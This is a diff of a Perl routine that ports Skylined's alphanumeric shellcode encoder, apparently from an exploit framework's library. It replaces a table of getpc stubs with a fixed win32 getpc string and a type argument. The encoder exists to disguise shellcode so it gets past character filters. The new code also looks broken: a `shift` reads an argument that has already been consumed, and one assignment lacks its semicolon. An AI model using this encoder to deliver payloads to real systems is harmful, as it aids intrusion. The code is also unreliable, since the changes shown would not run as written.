@@ -96,8 +96,14 @@ sub EncodeFnstenv
 # This code is a port of Skylined's awesome alpha encoder
 #
 sub EncodeAlphaNum {
-    # $opts->{'win32'} == use win32 getpc and decode
-    my ($rawshell, $xbadc, $opts) = @_;
+    my ($rawshell, $xbadc) = @_;
+    $type = shift || '[esp]';    
+
+    if (! exists($baseaddr{$type}))
+    {
+        print "Encoder failed: invalid type specified\n";
+        return;
+    }
 
     # the decoder in all its glory (hardcoded for 9 byte baseaddr)
     my $decoder = 'VTX630VX4A0B6HH0B30BCVX2BDBH4A2AD0ADTBDQB0ADAVX4Z8BDJOM';
@@ -125,91 +131,16 @@ sub EncodeAlphaNum {
     $baseaddr{'[esp]'}  = 'OZJJJJJRY';
     $baseaddr{'win32'}  = $baseaddr{'ecx'};
 
-    # jump to the byte before the end of this, so the byte following
-    # this becomes the second byte of the new instruction we jump to
-    # call4 getpc's use a push [reg] second byte, then pop twice
-    my $call4 = "\xe8\xff\xff\xff\xff";
+    my $win32getpc = 'VTX630VXH49HHHPhYAAQhZYYYYAAQQDDDd36FFFFTXVj0PPTUPPa301089'
     
-    # this is a the extensible getpc array
-    my $getpc =
+    if ($type eq 'win32' && ! Pex::Utils::CharsInBuffer($baseaddr{'win32'}.$win32getpc, $xbadc))
     {
-        'eax'   =>
-        [
-            $call4. "0XX",
-        ],
-        'ebx',
-        [
-            $call4. "3[[",
-        ],    
-        'ecx',
-        [
-            $call4. "1YY",
-        ],
-        'edx',
-        [
-            $call4. "2ZZ",
-        ],
-        'esp',
-        [
-            $call4. "\\\\",
-        ], 
-        'ebp',
-        [
-            $call4. "]",
-        ],
-        'esi',
-        [
-            $call4. "^",
-        ],
-        'edi',
-        [
-            $call4. "_",
-        ],              
-        '[esp]' =>
-        [
-            $call4,
-        ],
-        'win32' =>
-        [
-            'VTX630VXH49HHHPhYAAQhZYYYYAAQQDDDd36FFFFTXVj0PPTUPPa301089',
-        ],
-    };
-
-    # if this we are encoding this for win32, try the easy way first
-    if (exists($opts->{'win32'}) && ! Pex::Utils::CharsInBuffer($baseaddr{'win32'}, $xbadc))
+        $encoded = $win32getpc . $baseaddr{'win32'} . $decoder;
+    } 
+    else 
     {
-        foreach my $pc (@{ $getpc->{'win32'} })
-        {
-            if (! Pex::Utils::CharsInBuffer($pc, $xbadc))
-            {
-                $encoded = $pc . $baseaddr{'win32'};
-                last;
-            }
-        }
+        $encoded = $baseaddr{$type} . $decoder;
     }
-
-    if (! $encoded)
-    {
-        foreach my $meth (keys(%baseaddr))
-        {
-            last if $encoded; 
-            next if Pex::Utils::CharsInBuffer($baseaddr{$meth}, $xbadc);
-            foreach my $pc (@{ $getpc->{$meth}})
-            {
-                if (! Pex::Utils::CharsInBuffer($pc, $xbadc))
-                {
-                    $encoded = $pc . $baseaddr{$meth};
-                }
-            }
-        }
-    }
-
-    if (! $encoded)
-    {
-        print "Encoder failed: restricted character in all getpc/baseaddr options\n";
-        return;
-    }
-
 
     my @alphanum = split(//, $allowed);
     my (@lonibs, @hinibs);
